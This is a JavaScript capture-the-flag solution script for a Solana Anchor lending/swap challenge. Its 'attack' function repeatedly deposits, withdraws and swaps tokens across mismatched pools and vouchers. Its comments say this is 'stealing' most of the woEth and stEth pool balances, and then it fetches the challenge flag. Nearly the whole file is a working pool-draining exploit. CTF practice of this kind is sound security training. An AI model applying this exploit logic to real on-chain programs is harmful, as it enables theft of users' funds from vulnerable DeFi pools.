import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { parseAccounts, sendInstructions, sleep } from "./util.js";
import { PublicKey, Transaction } from "@solana/web3.js";
import { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge2.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeTwo;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {
  const woEthDecimals = 8;
  const soEthDecimals = 6;
  const stEthDecimals = 8;
  const {
    state,
    woEthMint,
    woEthPool,
    woEthPoolAccount,
    woEthVoucherMint,
    soEthMint,
    soEthPool,
    soEthPoolAccount,
    stEthMint,
    stEthPool,
    stEthPoolAccount,
    stEthVoucherMint,
  } = accounts;

  const playerWoEthAta = await getAssociatedTokenAddress(
    woEthMint,
    player.publicKey,
  );
  const playerWoEthVoucherAta = await getAssociatedTokenAddress(
    woEthVoucherMint,
    player.publicKey,
  );
  const playerSoEthAta = await getAssociatedTokenAddress(
    soEthMint,
    player.publicKey,
  );
  const playerStEthAta = await getAssociatedTokenAddress(
    stEthMint,
    player.publicKey,
  );
  const playerStEthVoucherAta = await getAssociatedTokenAddress(
    stEthVoucherMint,
    player.publicKey,
  );

  let poolSoEthBalance = 100_000_000;

  // stealing woEth
  let playerWoEthBalanceAtomics = 1000;
  let poolWoEthBalance = 100_000_000;
  while (poolWoEthBalance > 10_000_000) {
    const tx = new Transaction();
    // woEthDepositAmt = soEthExtracted
    // 100 seems to cause some rounding errs idk, only need to steal half anyway
    const woEthDepositAmt = Math.min(playerWoEthBalanceAtomics, poolSoEthBalance, poolWoEthBalance / 110);
    if (woEthDepositAmt <= 0) {
      break;
    }
    playerWoEthBalanceAtomics -= woEthDepositAmt;
    poolWoEthBalance += woEthDepositAmt;
    tx.add(
      await program.methods.deposit(new BN(woEthDepositAmt))
        .accounts({
          player: player.publicKey,
          depositor: player.publicKey,
          state,
          depositMint: woEthMint,
          pool: woEthPool,
          poolAccount: woEthPoolAccount,
          voucherMint: woEthVoucherMint,
          depositorAccount: playerWoEthAta,
          depositorVoucherAccount: playerWoEthVoucherAta,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );
    tx.add(
      await program.methods.withdraw(new BN(woEthDepositAmt))
        .accounts({
          player: player.publicKey,
          depositor: player.publicKey,
          state,
          depositMint: woEthMint,
          pool: soEthPool,
          poolAccount: soEthPoolAccount,
          voucherMint: woEthVoucherMint,
          depositorAccount: playerSoEthAta,
          depositorVoucherAccount: playerWoEthVoucherAta,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );
    poolSoEthBalance -= woEthDepositAmt;
    const swapAmt = Math.min(woEthDepositAmt, poolWoEthBalance / 110);
    tx.add(
      await program.methods.swap(new BN(swapAmt))
        .accounts({
          player: player.publicKey,
          swapper: player.publicKey,
          state,
          fromPool: soEthPool,
          toPool: woEthPool,
          fromPoolAccount: soEthPoolAccount,
          toPoolAccount: woEthPoolAccount,
          fromSwapperAccount: playerSoEthAta,
          toSwapperAccount: playerWoEthAta,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );

    await conn.sendTransaction(tx, [player]);

    poolSoEthBalance += swapAmt;
    playerWoEthBalanceAtomics += swapAmt * 100;
    poolWoEthBalance -= swapAmt * 100;

    await sleep(5_000);
    console.log("next woEth");
  }

  console.log("stealing stEth");

  // stealing stEth
  let playerStEthBalanceAtomics = 1000;
  let poolStEthBalance = 100_000_000;
  while (poolStEthBalance > 10_000_000) {
    const tx = new Transaction();
    // stEthDepositAmt = soEthExtracted
    // 100 seems to cause some rounding errs idk, only need to steal at least half anyway
    const stEthDepositAmt = Math.min(playerStEthBalanceAtomics, poolSoEthBalance, poolStEthBalance / 110); 
    if (stEthDepositAmt <= 0) {
      break;
    }
    playerStEthBalanceAtomics -= stEthDepositAmt;
    poolStEthBalance += stEthDepositAmt;
    tx.add(
      await program.methods.deposit(new BN(stEthDepositAmt))
        .accounts({
          player: player.publicKey,
          depositor: player.publicKey,
          state,
          depositMint: stEthMint,
          pool: stEthPool,
          poolAccount: stEthPoolAccount,
          voucherMint: stEthVoucherMint,
          depositorAccount: playerStEthAta,
          depositorVoucherAccount: playerStEthVoucherAta,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );
    tx.add(
      await program.methods.withdraw(new BN(stEthDepositAmt))
        .accounts({
          player: player.publicKey,
          depositor: player.publicKey,
          state,
          depositMint: stEthMint,
          pool: soEthPool,
          poolAccount: soEthPoolAccount,
          voucherMint: stEthVoucherMint,
          depositorAccount: playerSoEthAta,
          depositorVoucherAccount: playerStEthVoucherAta,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );
    poolSoEthBalance -= stEthDepositAmt;
    const swapAmt = Math.min(stEthDepositAmt, poolStEthBalance / 110);
    tx.add(
      await program.methods.swap(new BN(swapAmt))
        .accounts({
          player: player.publicKey,
          swapper: player.publicKey,
          state,
          fromPool: soEthPool,
          toPool: stEthPool,
          fromPoolAccount: soEthPoolAccount,
          toPoolAccount: stEthPoolAccount,
          fromSwapperAccount: playerSoEthAta,
          toSwapperAccount: playerStEthAta,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );

    await conn.sendTransaction(tx, [player]);

    poolSoEthBalance += swapAmt;
    playerStEthBalanceAtomics += swapAmt * 100;
    poolStEthBalance -= swapAmt * 100;

    await sleep(5_000);
    console.log("next stEth");
  }

}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 2);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
